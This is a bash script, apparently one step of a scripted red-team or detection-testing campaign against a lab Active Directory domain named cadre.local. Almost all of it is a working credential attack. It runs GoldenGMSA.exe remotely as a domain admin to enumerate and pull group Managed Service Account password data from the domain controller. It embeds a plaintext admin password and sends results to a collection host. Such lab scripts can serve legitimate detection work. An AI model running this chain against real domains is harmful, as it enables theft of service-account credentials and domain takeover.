#!/usr/bin/env bash
# T024 — gMSA extraction from ws01 as chief_command (cadre.local DA)
# Enumerates gMSAs and extracts password blob if permitted.
# Entry credential: chief_command (earned via Branch A T015 ForceChangePassword)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T024-GMSA-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T024 gMSA extraction | ${CASE_ID} | T0=${T0} ==="

DOMAIN_ROOT="${DOMAIN_ROOT:-cadre.local}"
DC01="${DC01:-dc01.cadre.local}"

CMD='
$g = "C:\Tools\cadre-attack\GoldenGMSA.exe";
if (-not (Test-Path $g)) { throw "GoldenGMSA.exe not found" }
& $g cache /domain:"'''"${DOMAIN_ROOT}"'''" /dc:"'''"${DC01}"'''";
& $g gmsainfo /domain:"'''"${DOMAIN_ROOT}"'''" /dc:"'''"${DC01}"'''";
Write-Output "T024_OK: gMSA enumeration complete"
'

ws01_exec_as chief_command 'C0mm@nd_Ch1ef!' "$CMD" 'cadre.local'

cadre_export "${CASE_ID}" T024 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T024 run complete ==="
